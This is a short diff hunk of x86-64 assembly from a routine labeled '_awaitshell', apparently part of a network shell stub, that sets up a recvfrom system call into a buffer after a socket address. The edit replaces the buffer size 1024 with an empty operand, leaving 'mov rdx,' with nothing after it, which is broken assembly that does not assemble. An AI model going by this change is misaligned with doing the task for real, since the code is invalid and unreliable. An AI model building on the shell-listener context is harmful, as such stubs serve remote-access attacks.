@@ -59,7 +59,7 @@ _awaitshell:
   pop r8
   xor r10, r10
   lea rsi, [rsp + r9 + 16] ; Buffer after Sockaddr
-  mov rdx, 1024       ; Size
+  mov rdx,        ; Size
   mov rdi, rax
   push 45
   pop rax    
